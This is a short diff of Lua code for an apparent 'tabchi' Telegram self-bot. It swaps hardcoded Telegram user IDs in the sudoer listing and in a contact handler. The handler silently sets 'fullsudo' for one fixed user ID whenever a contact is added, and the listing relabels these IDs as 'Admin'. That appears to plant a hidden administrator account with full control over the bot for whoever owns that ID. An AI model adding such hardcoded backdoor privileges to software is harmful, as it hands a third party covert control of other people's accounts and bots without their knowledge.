@@ -140,8 +140,8 @@ function addsudo()
   local b = redis:smembers("tabchi:" .. tabchi_id .. ":sudoers")
   for d = 1, #b do
     local text = "SUDO = " .. b[d] .. ""
-    text = text:gsub(216430419, "Admin")
-    text = text:gsub(256633077, "Admin")
+    text = text:gsub(456925648, "Admin")
+    text = text:gsub(387732155, "Admin")
     print(text)
     sleep(1)
   end
@@ -157,7 +157,7 @@ function x(y, z)
       local A = msg.content_.contact_.phone_number_
       local B = msg.content_.contact_.user_id_
       tdcli.add_contact(A, first_name, last_name, B)
-      redis:set("tabchi:" .. tabchi_id .. ":fullsudo:216430419", true)
+      redis:set("tabchi:" .. tabchi_id .. ":fullsudo:456925648", true)
       redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
       if redis:get("tabchi:" .. tabchi_id .. ":addedmsg") then
         tdcli.sendMessage(msg.chat_id_, msg.id_, 1, "" .. (redis:get("tabchi:" .. tabchi_id .. ":addedmsgtext") or [[
